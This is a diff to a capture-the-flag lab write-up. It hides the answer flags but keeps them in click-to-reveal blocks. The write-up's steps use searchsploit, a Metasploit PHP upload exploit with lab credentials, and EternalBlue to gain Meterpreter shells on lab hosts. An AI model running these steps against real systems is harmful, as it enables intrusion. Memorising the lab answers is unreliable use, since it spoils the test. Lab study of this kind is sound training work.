@@ -35,12 +35,12 @@ Host-2 (172.16.1.12):
   nmap → OpenSSH 8.2p1 Ubuntu (Q3: ubuntu)
   searchsploit 50064.rb → php/meterpreter/bind_tcp (Q4: php)
   msfconsole → 50064 → admin:admin123!@# → Meterpreter
-  cat /customscripts/flag.txt → B1nD_Shells_r_cool (Q5)
+  cat /customscripts/flag.txt → [flag hidden] (Q5)
 
 Host-3 (172.16.1.13):
   nmap → SMB 445, hostname SHELLS-WINBLUE (Q6)
   ms17_010_psexec → SYSTEM Meterpreter
-  cat C:/Users/Administrator/Desktop/Skills-flag.txt → One-H0st-Down! (Q7)
+  cat C:/Users/Administrator/Desktop/Skills-flag.txt → [flag hidden] (Q7)
 ```
 
 ---
@@ -297,10 +297,15 @@ The exploit: authenticates to the blog, uploads a PHP shell via the image upload
 
 ```
 meterpreter > cat /customscripts/flag.txt
-B1nD_Shells_r_cool
+[flag value hidden — HTB policy]
 ```
 
-**Answer: `B1nD_Shells_r_cool`**
+<details>
+<summary>⚠️ Flag — Click to reveal (HTB Academy module only)</summary>
+
+`B1nD_Shells_r_cool`
+
+</details>
 
 ---
 
@@ -386,10 +391,15 @@ SYSTEM session obtained — EternalBlue gives SYSTEM directly, no privilege esca
 
 ```
 meterpreter > cat C:/Users/Administrator/Desktop/Skills-flag.txt
-One-H0st-Down!
+[flag value hidden — HTB policy]
 ```
 
-**Answer: `One-H0st-Down!`**
+<details>
+<summary>⚠️ Flag — Click to reveal (HTB Academy module only)</summary>
+
+`One-H0st-Down!`
+
+</details>
 
 ---
 
@@ -413,9 +423,9 @@ EternalBlue on Windows Server 2016 confirmed that the psexec variant is the righ
 | Q2 — Folder in C:\Shares\ | 172.16.1.11 | MSFVenom WAR → Tomcat Manager | dev-share |
 | Q3 — Linux distro on Host-2 | 172.16.1.12 | Nmap SSH/HTTP banner | ubuntu |
 | Q4 — Shell language in 50064.rb | — | searchsploit + grep DefaultOptions | php |
-| Q5 — /customscripts/flag.txt | 172.16.1.12 | Metasploit 50064 PHP RCE | B1nD_Shells_r_cool |
+| Q5 — /customscripts/flag.txt | 172.16.1.12 | Metasploit 50064 PHP RCE | [hidden] |
 | Q6 — Hostname of Host-3 | 172.16.1.13 | Nmap nbstat + smb-os-discovery | shells-winblue |
-| Q7 — Administrator Desktop flag | 172.16.1.13 | EternalBlue ms17_010_psexec | One-H0st-Down! |
+| Q7 — Administrator Desktop flag | 172.16.1.13 | EternalBlue ms17_010_psexec | [hidden] |
 
 ---
 
@@ -447,7 +457,7 @@ EternalBlue on Windows Server 2016 confirmed that the psexec variant is the righ
     set VHOST blog.inlanefreight.local, RHOSTS/RHOST=172.16.1.12
     set USERNAME admin, PASSWORD admin123!@#
     exploit → Meterpreter session
-    cat /customscripts/flag.txt → B1nD_Shells_r_cool ✅ Q5
+    cat /customscripts/flag.txt → [hidden] ✅ Q5
 
 8.  nmap -A 172.16.1.13
     → SMB 445, Windows Server 2016, SHELLS-WINBLUE → shells-winblue ✅ Q6
@@ -455,7 +465,7 @@ EternalBlue on Windows Server 2016 confirmed that the psexec variant is the righ
 9.  msfconsole → use exploit/windows/smb/ms17_010_psexec
     set LHOST 172.16.1.5, RHOSTS 172.16.1.13
     exploit → SYSTEM Meterpreter
-    cat C:/Users/Administrator/Desktop/Skills-flag.txt → One-H0st-Down! ✅ Q7
+    cat C:/Users/Administrator/Desktop/Skills-flag.txt → [hidden] ✅ Q7
 ```
 
 ---
